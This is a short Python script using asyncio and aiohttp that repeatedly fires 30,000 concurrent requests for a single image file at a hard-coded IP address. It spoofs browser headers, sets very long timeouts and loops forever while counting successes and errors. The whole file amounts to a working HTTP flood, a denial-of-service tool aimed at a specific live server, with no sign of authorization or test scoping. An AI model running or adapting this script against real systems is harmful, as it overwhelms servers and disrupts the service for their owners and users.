import aiohttp
import asyncio

# Set the URL
url = 'http://119.29.179.251/assets/prod6-CI3HaT-C.png'

# Define the headers
headers = {
    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Host': '119.29.179.251',
    'Pragma': 'no-cache',
    'Referer': 'http://119.29.179.251/',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
}

succ_count = 0
error_count = 0
error_info_set = set()

async def fetch(url, headers):
    global succ_count, error_count, error_info_set
    timeout = aiohttp.ClientTimeout(total=86400, connect=3600, sock_read=3600)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        try:
            response = await session.get(url, headers=headers)
            image_data = await response.read()
            succ_count += 1
        except Exception as e:
            # Handle any exceptions that occur during the request
            error_count += 1
            error_info_set.add(str(e))

async def main():
    while True:
        tasks = []
        concurrency = 30000
        # Create multiple tasks to fetch the URL
        for i in range(concurrency):
            task = asyncio.create_task(fetch(url, headers))
            tasks.append(task)
        # Run the tasks concurrently
        await asyncio.gather(*tasks)
        print(f"Success count: {succ_count}, Error count: {error_count}")
        print(f"Error info: {error_info_set}")
    

# Run the main function
if __name__ == "__main__":
    asyncio.run(main())